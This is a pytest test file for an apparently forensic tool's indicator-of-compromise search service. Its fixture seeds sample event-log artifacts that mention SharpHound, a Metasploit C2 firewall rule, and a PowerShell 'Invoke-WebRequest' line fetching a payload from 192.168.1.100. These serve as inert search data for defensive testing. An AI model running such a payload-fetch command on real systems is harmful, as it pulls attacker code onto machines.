"""Tests for the search service."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from uuid import uuid4

import pytest
import pytest_asyncio

from defair.services import search_service


@pytest_asyncio.fixture
async def case_with_searchable_data(db_conn):
    """Create a case with artifacts containing searchable data."""
    cid = uuid4().hex
    now = datetime.now(UTC).isoformat()
    await db_conn.execute(
        "INSERT INTO cases (id, case_number, name, created_at, updated_at) VALUES (?, ?, ?, ?, ?)",
        (cid, "CASE-2026-003", "Search Test", now, now),
    )

    artifacts = [
        ("ART-001", "User ran SharpHound-v1.1.0.zip", "evtxecmd",
         json.dumps({"path": "C:\\Users\\Downloads\\SharpHound-v1.1.0.zip"}),
         "DESKTOP-01", "cyberjunkie"),
        ("ART-002", "Metasploit C2 Bypass firewall rule", "evtxecmd",
         json.dumps({"rule_name": "Metasploit C2 Bypass"}),
         "DESKTOP-01", None),
        ("ART-003", "PowerShell Invoke-WebRequest executed", "hayabusa",
         json.dumps({"details": "Invoke-WebRequest http://192.168.1.100/payload"}),
         "DESKTOP-01", "cyberjunkie"),
        ("ART-004", "Normal logon event", "evtxecmd",
         json.dumps({"logon_type": "2"}),
         "DESKTOP-01", "admin"),
    ]

    for art_num, desc, tool, data, host, user in artifacts:
        await db_conn.execute(
            """INSERT INTO artifacts
            (id, artifact_number, case_id, artifact_type, source_tool,
             timestamp, description, data, hostname, username, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (uuid4().hex, art_num, cid, "windows.evtx.generic", tool,
             "2023-03-27T14:00:00Z", desc, data, host, user, now),
        )
    await db_conn.commit()
    return cid


class TestSearchService:
    @pytest.mark.asyncio
    async def test_search_ioc_by_description(self, db_conn, case_with_searchable_data):
        cid = case_with_searchable_data
        result = await search_service.search_ioc(db_conn, cid, "SharpHound")

        assert result["ioc"] == "SharpHound"
        assert result["match_count"] == 1
        assert result["matches"][0]["description"] == "User ran SharpHound-v1.1.0.zip"

    @pytest.mark.asyncio
    async def test_search_ioc_by_data(self, db_conn, case_with_searchable_data):
        cid = case_with_searchable_data
        result = await search_service.search_ioc(db_conn, cid, "192.168.1.100")

        assert result["match_count"] == 1
        assert "hayabusa" in result["tools_matched"]

    @pytest.mark.asyncio
    async def test_search_ioc_by_hostname(self, db_conn, case_with_searchable_data):
        cid = case_with_searchable_data
        result = await search_service.search_ioc(db_conn, cid, "DESKTOP-01")

        assert result["match_count"] == 4

    @pytest.mark.asyncio
    async def test_search_ioc_by_username(self, db_conn, case_with_searchable_data):
        cid = case_with_searchable_data
        result = await search_service.search_ioc(db_conn, cid, "cyberjunkie")

        assert result["match_count"] == 2

    @pytest.mark.asyncio
    async def test_search_ioc_no_matches(self, db_conn, case_with_searchable_data):
        cid = case_with_searchable_data
        result = await search_service.search_ioc(db_conn, cid, "nonexistent_ioc")

        assert result["match_count"] == 0
        assert result["matches"] == []
        assert result["tools_matched"] == []

    @pytest.mark.asyncio
    async def test_search_ioc_metasploit(self, db_conn, case_with_searchable_data):
        cid = case_with_searchable_data
        result = await search_service.search_ioc(db_conn, cid, "Metasploit")

        assert result["match_count"] == 1
        assert "evtxecmd" in result["tools_matched"]

    @pytest.mark.asyncio
    async def test_search_tools_matched(self, db_conn, case_with_searchable_data):
        cid = case_with_searchable_data
        result = await search_service.search_ioc(db_conn, cid, "DESKTOP")

        assert sorted(result["tools_matched"]) == ["evtxecmd", "hayabusa"]
